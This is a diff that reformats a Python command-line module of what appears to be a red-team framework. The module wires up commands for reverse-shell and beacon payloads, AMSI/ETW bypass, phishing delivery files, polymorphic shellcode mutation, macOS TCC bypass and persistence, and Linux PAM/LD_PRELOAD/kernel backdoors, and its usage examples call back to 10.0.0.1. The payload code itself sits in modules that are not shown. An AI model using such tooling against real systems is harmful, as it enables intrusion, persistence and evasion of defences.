@@ -15,7 +15,7 @@ Provides:
 
 from __future__ import annotations
 
-import cmd2
+from pathlib import Path
 
 from cli.commands._base import LazyOwnCommandSet
 
@@ -29,16 +29,16 @@ class PayloadArsenalCommandSet(LazyOwnCommandSet):
     def do_dotnet_payload(self, line: str) -> None:
         """Generate a .NET/C# payload.
 
-Usage: dotnet_payload <template> [LHOST=<ip>] [LPORT=<port>] [--format f] [--target exe|dll] [--platform x86|x64|AnyCPU]
+        Usage: dotnet_payload <template> [LHOST=<ip>] [LPORT=<port>] [--format f] [--target exe|dll] [--platform x86|x64|AnyCPU]
 
-Templates: reverse_tcp, http_beacon, process_injection, amsi_bypass, etw_bypass, token_impersonation
+        Templates: reverse_tcp, http_beacon, process_injection, amsi_bypass, etw_bypass, token_impersonation
 
-Examples:
-    dotnet_payload reverse_tcp LHOST=10.0.0.1 LPORT=4444
-    dotnet_payload http_beacon LHOST=10.0.0.1 LPORT=443 --format ps1
-    dotnet_payload process_injection shellcode_b64=BASE64 --target exe --platform x64
-"""
-        from modules.dotnet_payload import DotNetPayloadFactory, DotNetPayloadConfig
+        Examples:
+            dotnet_payload reverse_tcp LHOST=10.0.0.1 LPORT=4444
+            dotnet_payload http_beacon LHOST=10.0.0.1 LPORT=443 --format ps1
+            dotnet_payload process_injection shellcode_b64=BASE64 --target exe --platform x64
+        """
+        from modules.dotnet_payload import DotNetPayloadConfig, DotNetPayloadFactory
 
         if not line.strip():
             self._cmd.perror("Usage: dotnet_payload <template> [options]")
@@ -89,7 +89,7 @@ Examples:
         factory = DotNetPayloadFactory()
         result = factory.generate(config)
 
-        self._cmd.poutput(f"\n[+] .NET/C# Payload Generated")
+        self._cmd.poutput("\n[+] .NET/C# Payload Generated")
         self._cmd.poutput(f"    Template : {result['template']}")
         self._cmd.poutput(f"    Target   : {result['target']}")
         self._cmd.poutput(f"    Platform : {result['platform']}")
@@ -114,14 +114,15 @@ Examples:
     def do_arsenal_show(self, line: str) -> None:
         """Show payload arsenal items.
 
-Usage: arsenal_show <category>
+        Usage: arsenal_show <category>
 
-Categories: dotnet_templates, staged_formats, macos_payloads, linux_payloads
-"""
+        Categories: dotnet_templates, staged_formats, macos_payloads, linux_payloads
+        """
         line = line.strip().lower()
 
         if line == "dotnet_templates":
             from modules.dotnet_payload import DotNetPayloadFactory
+
             templates = DotNetPayloadFactory.list_templates()
             self._cmd.poutput(f"\n[ .NET/C# Payload Templates — {len(templates)} available ]\n")
             for t in templates:
@@ -130,17 +131,18 @@ Categories: dotnet_templates, staged_formats, macos_payloads, linux_payloads
             return
 
         if line == "staged_formats":
-            self._cmd.poutput(f"\n[ Staged Delivery Formats ]\n")
+            self._cmd.poutput("\n[ Staged Delivery Formats ]\n")
             for fmt in ["hta", "vba", "xlm", "lnk", "iso", "vhd"]:
                 self._cmd.poutput(f"    {fmt}")
-            self._cmd.poutput(f"\n[ Phishing Templates ]\n")
+            self._cmd.poutput("\n[ Phishing Templates ]\n")
             for tmpl in ["office365", "gmail", "outlook"]:
                 self._cmd.poutput(f"    {tmpl}")
             self._cmd.poutput("")
             return
 
         if line == "macos_payloads":
-            from modules.macos_payloads import MacOSPayloadFactory, TCC_SERVICES, PERSISTENCE_METHODS
+            from modules.macos_payloads import PERSISTENCE_METHODS, TCC_SERVICES
+
             self._cmd.poutput(f"\n[ macOS TCC Services — {len(TCC_SERVICES)} ]\n")
             for svc in TCC_SERVICES:
                 self._cmd.poutput(f"    {svc}")
@@ -152,6 +154,7 @@ Categories: dotnet_templates, staged_formats, macos_payloads, linux_payloads
 
         if line == "linux_payloads":
             from modules.linux_advanced_payloads import LinuxAdvancedPayloadFactory
+
             lf = LinuxAdvancedPayloadFactory()
             self._cmd.poutput(f"\n[ Linux LD_PRELOAD Hook Functions — {len(lf.list_hook_functions())} ]\n")
             for h in lf.list_hook_functions():
@@ -162,21 +165,23 @@ Categories: dotnet_templates, staged_formats, macos_payloads, linux_payloads
             self._cmd.poutput("")
             return
 
-        self._cmd.poutput("arsenal_show <category>: dotnet_templates | staged_formats | macos_payloads | linux_payloads")
+        self._cmd.poutput(
+            "arsenal_show <category>: dotnet_templates | staged_formats | macos_payloads | linux_payloads"
+        )
 
     def do_staged_delivery(self, line: str) -> None:
         """Generate staged delivery artifacts (HTA, VBA, LNK, ISO, VHD).
 
-Usage: staged_delivery <format> [LHOST=<ip>] [LPORT=<port>] [--app-name "Name"]
+        Usage: staged_delivery <format> [LHOST=<ip>] [LPORT=<port>] [--app-name "Name"]
 
-Formats: hta, vba, xlm, lnk, iso, vhd, all
-Phishing: office365, gmail, outlook
+        Formats: hta, vba, xlm, lnk, iso, vhd, all
+        Phishing: office365, gmail, outlook
 
-Examples:
-    staged_delivery hta LHOST=10.0.0.1 LPORT=443 --app-name "QuarterlyReport"
-    staged_delivery all LHOST=10.0.0.1 LPORT=8443
-    staged_delivery office365 LHOST=10.0.0.1 LPORT=443
-"""
+        Examples:
+            staged_delivery hta LHOST=10.0.0.1 LPORT=443 --app-name "QuarterlyReport"
+            staged_delivery all LHOST=10.0.0.1 LPORT=8443
+            staged_delivery office365 LHOST=10.0.0.1 LPORT=443
+        """
         from modules.staged_delivery import StagedDeliveryFactory, StageDeliveryConfig
 
         if not line.strip():
@@ -256,13 +261,13 @@ Examples:
     def do_polymorphic(self, line: str) -> None:
         """Apply polymorphic mutation to shellcode.
 
-Usage: polymorphic <shellcode_hex> [--passes N] [--arch x64|x86] [--nop] [--xor] [--compress] [--base64]
+        Usage: polymorphic <shellcode_hex> [--passes N] [--arch x64|x86] [--nop] [--xor] [--compress] [--base64]
 
-Examples:
-    polymorphic fc4883e4f0e8c0000000415141505251564831 --passes 3
-    polymorphic $(cat shellcode.hex) --passes 5 --xor --compress --base64
-"""
-        from modules.polymorphic_engine import PolymorphicEngine, MutationConfig
+        Examples:
+            polymorphic fc4883e4f0e8c0000000415141505251564831 --passes 3
+            polymorphic $(cat shellcode.hex) --passes 5 --xor --compress --base64
+        """
+        from modules.polymorphic_engine import MutationConfig, PolymorphicEngine
 
         if not line.strip():
             self._cmd.perror("Usage: polymorphic <shellcode_hex> [options]")
@@ -306,14 +311,16 @@ Examples:
         engine = PolymorphicEngine(config=config)
         mutated = engine.mutate(shellcode, arch=arch)
 
-        self._cmd.poutput(f"\n[+] Polymorphic mutation complete")
+        self._cmd.poutput("\n[+] Polymorphic mutation complete")
         self._cmd.poutput(f"    Original  : {len(shellcode)} bytes")
         self._cmd.poutput(f"    Mutated   : {len(mutated)} bytes ({len(mutated) / max(len(shellcode), 1):.1f}x)")
 
         audit = engine.get_audit_summary()
         self._cmd.poutput(f"    Variants  : {audit['variants']}")
-        self._cmd.poutput(f"    Entropy   : {audit['entropy_min']} → {audit['entropy_max']} (avg {audit.get('entropy_avg', '?')})")
-        self._cmd.poutput(f"    Hashes    :")
+        self._cmd.poutput(
+            f"    Entropy   : {audit['entropy_min']} → {audit['entropy_max']} (avg {audit.get('entropy_avg', '?')})"
+        )
+        self._cmd.poutput("    Hashes    :")
         for h in audit["hashes"][-3:]:
             self._cmd.poutput(f"        {h[:32]}...")
         self._cmd.poutput(f"    Hex preview: {mutated[:64].hex()}...")
@@ -321,16 +328,16 @@ Examples:
     def do_macos_payload(self, line: str) -> None:
         """Generate macOS payloads (.app bundles, persistence, TCC bypass).
 
-Usage: macos_payload <type> [LHOST=<ip>] [LPORT=<port>] [--app-name "Name"]
+        Usage: macos_payload <type> [LHOST=<ip>] [LPORT=<port>] [--app-name "Name"]
 
-Types: app_bundle, launchd, tcc_bypass, osascript, swift, all
+        Types: app_bundle, launchd, tcc_bypass, osascript, swift, all
 
-Examples:
-    macos_payload app_bundle LHOST=10.0.0.1 LPORT=4444 --app-name "SystemPreferences"
-    macos_payload launchd LHOST=10.0.0.1 LPORT=8443
-    macos_payload all LHOST=10.0.0.1 LPORT=4444
-"""
-        from modules.macos_payloads import MacOSPayloadFactory, MacOSPayloadConfig
+        Examples:
+            macos_payload app_bundle LHOST=10.0.0.1 LPORT=4444 --app-name "SystemPreferences"
+            macos_payload launchd LHOST=10.0.0.1 LPORT=8443
+            macos_payload all LHOST=10.0.0.1 LPORT=4444
+        """
+        from modules.macos_payloads import MacOSPayloadConfig, MacOSPayloadFactory
 
         if not line.strip():
             self._cmd.perror("Usage: macos_payload <type> [options]")
@@ -375,7 +382,7 @@ Examples:
             self._cmd.poutput(f"\n[+] .app bundle generated: {path}")
         elif ptype == "launchd":
             result = factory.generate_launchd_persistence()
-            self._cmd.poutput(f"\n[+] LaunchD persistence generated:")
+            self._cmd.poutput("\n[+] LaunchD persistence generated:")
             self._cmd.poutput(f"    plist : {result['plist_path']}")
             self._cmd.poutput(f"    script: {result['script_path']}")
         elif ptype == "tcc_bypass":
@@ -394,16 +401,16 @@ Examples:
     def do_linux_advanced_payload(self, line: str) -> None:
         """Generate advanced Linux payloads (LD_PRELOAD, eBPF, PAM, kernel module).
 
-Usage: linux_advanced_payload <type> [LHOST=<ip>] [LPORT=<port>]
+        Usage: linux_advanced_payload <type> [LHOST=<ip>] [LPORT=<port>]
 
-Types: ld_preload, ebpf, pam_backdoor, systemd, ssh, kernel_module, motd, udev, all
+        Types: ld_preload, ebpf, pam_backdoor, systemd, ssh, kernel_module, motd, udev, all
 
-Examples:
-    linux_advanced_payload ld_preload LHOST=10.0.0.1 LPORT=4444 --hook accept
-    linux_advanced_payload pam_backdoor LHOST=10.0.0.1 LPORT=8443
-    linux_advanced_payload all LHOST=10.0.0.1 LPORT=4444
-"""
-        from modules.linux_advanced_payloads import LinuxAdvancedPayloadFactory, LinuxAdvancedConfig
+        Examples:
+            linux_advanced_payload ld_preload LHOST=10.0.0.1 LPORT=4444 --hook accept
+            linux_advanced_payload pam_backdoor LHOST=10.0.0.1 LPORT=8443
+            linux_advanced_payload all LHOST=10.0.0.1 LPORT=4444
+        """
+        from modules.linux_advanced_payloads import LinuxAdvancedConfig, LinuxAdvancedPayloadFactory
 
         if not line.strip():
             self._cmd.perror("Usage: linux_advanced_payload <type> [options]")
@@ -458,7 +465,7 @@ Examples:
             self._cmd.poutput(f"    Binary: {binary}" if binary else "    Binary: gcc -lpam not available")
         elif ptype == "systemd":
             result = factory.generate_systemd_persistence()
-            self._cmd.poutput(f"\n[+] SystemD persistence generated:")
+            self._cmd.poutput("\n[+] SystemD persistence generated:")
             self._cmd.poutput(f"    Service: {result['service_name']}")
             self._cmd.poutput(f"    Install: {result['install_cmd']}")
         elif ptype == "ssh":
@@ -476,6 +483,3 @@ Examples:
         else:
             self._cmd.perror(f"Unknown Linux payload type: {ptype}")
             self._cmd.poutput("Types: ld_preload, ebpf, pam_backdoor, systemd, ssh, kernel_module, motd, udev, all")
-
-
-from pathlib import Path
